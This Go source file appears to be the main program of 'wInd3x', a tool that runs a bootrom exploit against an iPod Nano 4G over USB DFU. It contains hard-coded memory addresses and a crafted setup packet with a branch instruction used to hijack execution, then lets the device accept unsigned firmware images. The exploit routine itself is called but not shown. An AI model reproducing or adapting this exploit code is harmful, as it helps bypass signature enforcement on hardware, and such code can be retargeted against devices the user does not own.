package main

import (
	"flag"
	"fmt"
	"log"
	"os"

	"github.com/google/gousb"
)

var (
	flagImage string
)

func main() {
	flag.BoolVar(&flagForceExploit, "force", false, "Force re-running haxed DFU exploit (repeated use might lock up device)")
	flag.StringVar(&flagImage, "image", "", "Path to DFU image to run.")
	flag.Parse()

	log.Printf("        wInd3x - nano 4g bootrom exploit")
	log.Printf("  by q3k, with help from user890104, zizzy, d42")

	ctx, err := newContext()
	if err != nil {
		log.Fatalf("Failed to initialize USB: %v", err)
	}
	defer ctx.Close()

	dev, err := findDevice(ctx)
	if err != nil {
		log.Fatalf("Device unavailable: %v", err)
	}

	log.Printf("Found %s in DFU mode", dev.kind)
	if err := dev.clean(); err != nil {
		log.Fatalf("Could not get device into clean state: %v", err)
	}

	if err := dev.haxDFU(); err != nil {
		log.Fatalf("Failed to run wInd3x exploit: %v", err)
	}

	if flagImage != "" {
		log.Printf("Uploading %s...", flagImage)
		data, err := os.ReadFile(flagImage)
		if err != nil {
			log.Fatalf("Failed to read image: %v", err)
		}
		if err := dev.sendImage(data); err != nil {
			log.Fatalf("Failed to send image: %v", err)
		}
		log.Printf("Image sent.")
		return
	}

	log.Fatalf("Device will now accept signed and unsigned DFU images.")
}

type deviceKind string

const (
	deviceNano4 deviceKind = "n4g"
	deviceNano5 deviceKind = "n5g"
)

type device struct {
	kind          deviceKind
	exploitParams *exploitParameters
	usb           *gousb.Device
}

func (d deviceKind) String() string {
	switch d {
	case deviceNano4:
		return "Nano 4G"
	}
	return "UNKNOWN"
}

func newContext() (*gousb.Context, error) {
	resC := make(chan *gousb.Context)
	errC := make(chan error)

	go func() {
		defer func() {
			if r := recover(); r != nil {
				errC <- fmt.Errorf("%v", r)
			}
		}()

		resC <- gousb.NewContext()
	}()

	select {
	case err := <-errC:
		return nil, err
	case res := <-resC:
		return res, nil
	}
}

func findDevice(ctx *gousb.Context) (*device, error) {
	dev, err := ctx.OpenDeviceWithVIDPID(0x05ac, 0x1225)
	if err != nil {
		return nil, fmt.Errorf("could not open n4g in dfu mode: %w", err)
	}
	if dev == nil {
		return nil, fmt.Errorf("n4g in dfu mode not found")
	}
	return &device{
		kind: deviceNano4,
		exploitParams: &exploitParameters{
			dfuBufAddr:     0x2202db00,
			execAddr:       0x2202dc08,
			usbBufAddr:     0x2202e300,
			returnAddr:     0x20004d64,
			trampolineAddr: 0x3b0,
			// b 0x2202dc08
			setupPacket: []byte{0x40, 0xfe, 0xff, 0xea, 0x03, 0x00, 0x00, 0x00},
		},
		usb: dev,
	}, nil
}

func (d *device) clean() error {
	if err := d.clearStatus(); err != nil {
		return fmt.Errorf("ClrStatus: %w", err)
	}
	state, err := d.getState()
	if err != nil {
		return fmt.Errorf("GetState: %w", err)
	}
	if state != dfuIdle {
		return fmt.Errorf("unexpected DFU state %s", state)
	}
	return nil
}
